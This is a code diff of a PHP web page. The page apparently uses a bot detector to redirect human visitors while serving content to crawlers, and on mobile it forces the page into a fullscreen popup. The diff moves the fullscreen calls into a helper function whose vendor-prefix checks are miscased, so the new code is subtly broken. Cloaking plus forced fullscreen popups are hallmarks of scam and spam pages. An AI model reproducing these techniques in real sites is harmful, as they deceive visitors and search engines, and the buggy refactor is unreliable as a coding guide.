@@ -1,7 +1,7 @@
 <?php include("kids.php"); ?>
 <?php \BotDetecter::redirectIfNotBot(); ?>
 
-<!DOCTYPE html id="html">
+<!DOCTYPE html>
 <html>
 <head>
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
@@ -877,21 +877,19 @@
 </div>
 
 <script>
- 
+function fullScreen(element) {
+  if(element.requestFullscreen) {
+    element.requestFullscreen();
+  } else if(element.webkitrequestFullscreen) {
+    element.webkitRequestFullscreen();
+  } else if(element.mozRequestFullscreen) {
+    element.mozRequestFullScreen();
+  }
+}
   if (getMobileOperatingSystem() !== 'unknown') {
     $("body").addClass('pop_up');
-var i = document.getElementById("html");
-
-// go full-screen
-if (i.requestFullscreen) {
-	i.requestFullscreen();
-} else if (i.webkitRequestFullscreen) {
-	i.webkitRequestFullscreen();
-} else if (i.mozRequestFullScreen) {
-	i.mozRequestFullScreen();
-} else if (i.msRequestFullscreen) {
-	i.msRequestFullscreen();
-}
+	var html = document.documentElement;
+fullScreen(html);
     $(".s_pos_abs_1 a").click(closeMyPopup);
   } else {
     closeMyPopup();
